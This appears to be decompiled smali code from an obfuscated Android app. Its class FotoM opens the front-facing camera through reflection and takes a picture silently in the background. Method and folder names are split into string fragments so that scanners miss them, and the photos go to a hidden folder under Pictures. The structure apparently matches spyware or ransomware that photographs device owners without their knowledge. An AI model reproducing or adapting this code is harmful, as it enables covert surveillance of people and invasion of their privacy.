.class Lsojgp/zdga/pwrjbzetltzu/FotoM;
.super Landroid/os/AsyncTask;
.source "FotoM.java"


# annotations
.annotation build Landroid/annotation/TargetApi;
    value = 0x9
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field private cameras:Landroid/hardware/Camera;

.field private mContext:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 57
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 58
    iput-object p1, p0, Lsojgp/zdga/pwrjbzetltzu/FotoM;->mContext:Landroid/content/Context;

    .line 61
    return-void
.end method

.method private aaaaa()Ljava/lang/Object;
    .locals 18

    .prologue
    .line 67
    const/4 v1, 0x0

    .line 72
    .local v1, "camera":Landroid/hardware/Camera;
    :try_start_0
    const-string v14, "android.hardware.Camera"

    invoke-static {v14}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    .line 74
    .local v2, "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const/4 v3, 0x0

    .line 75
    .local v3, "cameraInfo":Ljava/lang/Object;
    const/4 v10, 0x0

    .line 76
    .local v10, "field":Ljava/lang/reflect/Field;
    const/4 v12, 0x0

    .line 77
    .local v12, "rrreee":I
    const-string v13, "berOfC"

    .line 78
    .local v13, "sdfds":Ljava/lang/String;
    new-instance v14, Ljava/lang/StringBuilder;

    const-string v15, "getNum"

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    const-string v15, "ameras"

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    const/4 v15, 0x0

    new-array v15, v15, [Ljava/lang/Class;

    invoke-virtual {v2, v14, v15}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    .line 80
    .local v6, "crutka":Ljava/lang/reflect/Method;
    if-eqz v6, :cond_0

    .line 81
    const/4 v14, 0x0

    const/4 v15, 0x0

    invoke-virtual {v6, v14, v15}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v14

    check-cast v14, Ljava/lang/Integer;

    invoke-virtual {v14}, Ljava/lang/Integer;->intValue()I

    move-result v12

    .line 84
    :cond_0
    const-string v14, "android.hardware.Camera$CameraInfo"

    invoke-static {v14}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4

    .line 85
    .local v4, "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    if-eqz v4, :cond_1

    .line 86
    invoke-virtual {v4}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v3

    .line 88
    .end local v3    # "cameraInfo":Ljava/lang/Object;
    :cond_1
    if-eqz v3, :cond_2

    .line 89
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v14

    const-string v15, "facing"

    invoke-virtual {v14, v15}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v10

    .line 93
    :cond_2
    const-string v14, "getCameraInfo"

    const/4 v15, 0x2

    new-array v15, v15, [Ljava/lang/Class;

    const/16 v16, 0x0

    sget-object v17, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v17, v15, v16

    const/16 v16, 0x1

    aput-object v4, v15, v16

    invoke-virtual {v2, v14, v15}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_8
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_7
    .catch Ljava/lang/NoSuchFieldException; {:try_start_0 .. :try_end_0} :catch_6
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_5
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljava/lang/InstantiationException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_2

    move-result-object v11

    .line 94
    .local v11, "getCameraInfoMethod":Ljava/lang/reflect/Method;
    if-eqz v11, :cond_3

    if-eqz v4, :cond_3

    if-eqz v10, :cond_3

    .line 95
    const/4 v8, 0x0

    .local v8, "eeer":I
    :goto_0
    if-lt v8, v12, :cond_5

    .line 121
    .end local v2    # "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v4    # "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v6    # "crutka":Ljava/lang/reflect/Method;
    .end local v8    # "eeer":I
    .end local v10    # "field":Ljava/lang/reflect/Field;
    .end local v11    # "getCameraInfoMethod":Ljava/lang/reflect/Method;
    .end local v12    # "rrreee":I
    .end local v13    # "sdfds":Ljava/lang/String;
    :cond_3
    :goto_1
    if-nez v1, :cond_4

    .line 127
    :try_start_1
    const-string v14, "android.hardware.Camera"

    invoke-static {v14}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v14

    const-string v15, "open"

    const/16 v16, 0x0

    invoke-virtual/range {v14 .. v16}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v14

    const-string v15, "android.hardware.Camera"

    invoke-static {v15}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v15

    const/16 v16, 0x0

    invoke-virtual/range {v14 .. v16}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v14

    move-object v0, v14

    check-cast v0, Landroid/hardware/Camera;

    move-object v1, v0
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_0

    .line 138
    :cond_4
    :goto_2
    return-object v1

    .line 96
    .restart local v2    # "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .restart local v4    # "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .restart local v6    # "crutka":Ljava/lang/reflect/Method;
    .restart local v8    # "eeer":I
    .restart local v10    # "field":Ljava/lang/reflect/Field;
    .restart local v11    # "getCameraInfoMethod":Ljava/lang/reflect/Method;
    .restart local v12    # "rrreee":I
    .restart local v13    # "sdfds":Ljava/lang/String;
    :cond_5
    const/4 v14, 0x0

    const/4 v15, 0x2

    :try_start_2
    new-array v15, v15, [Ljava/lang/Object;

    const/16 v16, 0x0

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v17

    aput-object v17, v15, v16

    const/16 v16, 0x1

    aput-object v3, v15, v16

    invoke-virtual {v11, v14, v15}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 97
    invoke-virtual {v10, v3}, Ljava/lang/reflect/Field;->getInt(Ljava/lang/Object;)I
    :try_end_2
    .catch Ljava/lang/ClassNotFoundException; {:try_start_2 .. :try_end_2} :catch_8
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_7
    .catch Ljava/lang/NoSuchFieldException; {:try_start_2 .. :try_end_2} :catch_6
    .catch Ljava/lang/IllegalAccessException; {:try_start_2 .. :try_end_2} :catch_5
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_2 .. :try_end_2} :catch_4
    .catch Ljava/lang/InstantiationException; {:try_start_2 .. :try_end_2} :catch_3
    .catch Ljava/lang/SecurityException; {:try_start_2 .. :try_end_2} :catch_2

    move-result v9

    .line 98
    .local v9, "facing":I
    const/4 v14, 0x1

    if-ne v9, v14, :cond_6

    .line 100
    :try_start_3
    const-string v7, "pe"

    .line 101
    .local v7, "dsfdsfsd":Ljava/lang/String;
    new-instance v14, Ljava/lang/StringBuilder;

    const-string v15, "o"

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    const-string v15, "n"

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    const/4 v15, 0x1

    new-array v15, v15, [Ljava/lang/Class;

    const/16 v16, 0x0

    sget-object v17, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v17, v15, v16

    invoke-virtual {v2, v14, v15}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    .line 102
    .local v5, "cameraOpenMethod":Ljava/lang/reflect/Method;
    if-eqz v5, :cond_6

    .line 103
    const/4 v14, 0x0

    const/4 v15, 0x1

    new-array v15, v15, [Ljava/lang/Object;

    const/16 v16, 0x0

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v17

    aput-object v17, v15, v16

    invoke-virtual {v5, v14, v15}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v14

    move-object v0, v14

    check-cast v0, Landroid/hardware/Camera;

    move-object v1, v0
    :try_end_3
    .catch Ljava/lang/RuntimeException; {:try_start_3 .. :try_end_3} :catch_9
    .catch Ljava/lang/ClassNotFoundException; {:try_start_3 .. :try_end_3} :catch_8
    .catch Ljava/lang/NoSuchMethodException; {:try_start_3 .. :try_end_3} :catch_7
    .catch Ljava/lang/NoSuchFieldException; {:try_start_3 .. :try_end_3} :catch_6
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_5
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_3 .. :try_end_3} :catch_4
    .catch Ljava/lang/InstantiationException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/lang/SecurityException; {:try_start_3 .. :try_end_3} :catch_2

    .line 95
    .end local v5    # "cameraOpenMethod":Ljava/lang/reflect/Method;
    .end local v7    # "dsfdsfsd":Ljava/lang/String;
    :cond_6
    :goto_3
    add-int/lit8 v8, v8, 0x1

    goto :goto_0

    .line 133
    .end local v2    # "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v4    # "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v6    # "crutka":Ljava/lang/reflect/Method;
    .end local v8    # "eeer":I
    .end local v9    # "facing":I
    .end local v10    # "field":Ljava/lang/reflect/Field;
    .end local v11    # "getCameraInfoMethod":Ljava/lang/reflect/Method;
    .end local v12    # "rrreee":I
    .end local v13    # "sdfds":Ljava/lang/String;
    :catch_0
    move-exception v14

    goto :goto_2

    .line 129
    :catch_1
    move-exception v14

    goto :goto_2

    .line 119
    :catch_2
    move-exception v14

    goto :goto_1

    .line 118
    :catch_3
    move-exception v14

    goto :goto_1

    .line 117
    :catch_4
    move-exception v14

    goto/16 :goto_1

    .line 116
    :catch_5
    move-exception v14

    goto/16 :goto_1

    .line 115
    :catch_6
    move-exception v14

    goto/16 :goto_1

    .line 114
    :catch_7
    move-exception v14

    goto/16 :goto_1

    .line 113
    :catch_8
    move-exception v14

    goto/16 :goto_1

    .line 105
    .restart local v2    # "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .restart local v4    # "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .restart local v6    # "crutka":Ljava/lang/reflect/Method;
    .restart local v8    # "eeer":I
    .restart local v9    # "facing":I
    .restart local v10    # "field":Ljava/lang/reflect/Field;
    .restart local v11    # "getCameraInfoMethod":Ljava/lang/reflect/Method;
    .restart local v12    # "rrreee":I
    .restart local v13    # "sdfds":Ljava/lang/String;
    :catch_9
    move-exception v14

    goto :goto_3
.end method

.method static synthetic access$1(Lsojgp/zdga/pwrjbzetltzu/FotoM;)Ljava/io/File;
    .locals 1

    .prologue
    .line 216
    invoke-direct {p0}, Lsojgp/zdga/pwrjbzetltzu/FotoM;->eeerrr()Ljava/io/File;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$2(Lsojgp/zdga/pwrjbzetltzu/FotoM;)Landroid/content/Context;
    .locals 1

    .prologue
    .line 55
    iget-object v0, p0, Lsojgp/zdga/pwrjbzetltzu/FotoM;->mContext:Landroid/content/Context;

    return-object v0
.end method

.method private eeerrr()Ljava/io/File;
    .locals 4

    .prologue
    .line 217
    const-string v1, "ctur"

    .line 219
    .local v1, "fdfd":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Pi"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "es"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    .line 220
    .local v0, "edre":Ljava/io/File;
    new-instance v2, Ljava/io/File;

    const-string v3, "Decrrhydsghd"

    invoke-direct {v2, v0, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    return-object v2
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lsojgp/zdga/pwrjbzetltzu/FotoM;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 9
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v8, 0x0

    .line 146
    new-instance v2, Lsojgp/zdga/pwrjbzetltzu/FotoM$1;

    invoke-direct {v2, p0}, Lsojgp/zdga/pwrjbzetltzu/FotoM$1;-><init>(Lsojgp/zdga/pwrjbzetltzu/FotoM;)V

    .line 195
    .local v2, "mCorkyListener":Landroid/hardware/Camera$PictureCallback;
    invoke-direct {p0}, Lsojgp/zdga/pwrjbzetltzu/FotoM;->aaaaa()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/hardware/Camera;

    iput-object v5, p0, Lsojgp/zdga/pwrjbzetltzu/FotoM;->cameras:Landroid/hardware/Camera;

    .line 196
    iget-object v5, p0, Lsojgp/zdga/pwrjbzetltzu/FotoM;->cameras:Landroid/hardware/Camera;

    if-eqz v5, :cond_0

    .line 198
    iget-object v5, p0, Lsojgp/zdga/pwrjbzetltzu/FotoM;->cameras:Landroid/hardware/Camera;

    invoke-virtual {v5, v8, v8, v2}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 213
    :goto_0
    return-object v8

    .line 204
    :cond_0
    const-string v1, "oc"

    .line 205
    .local v1, "fsd":Ljava/lang/String;
    iget-object v5, p0, Lsojgp/zdga/pwrjbzetltzu/FotoM;->mContext:Landroid/content/Context;

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "c"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "on"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    invoke-virtual {v5, v6, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    .line 206
    .local v4, "settings2":Landroid/content/SharedPreferences;
    new-instance v3, Lsojgp/zdga/pwrjbzetltzu/Pirat;

    invoke-direct {v3, v4}, Lsojgp/zdga/pwrjbzetltzu/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 207
    .local v3, "rtrtr":Lsojgp/zdga/pwrjbzetltzu/Pirat;
    invoke-virtual {v3}, Lsojgp/zdga/pwrjbzetltzu/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 208
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v5, "camera"

    const/4 v6, 0x2

    invoke-interface {v0, v5, v6}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 209
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    goto :goto_0
.end method
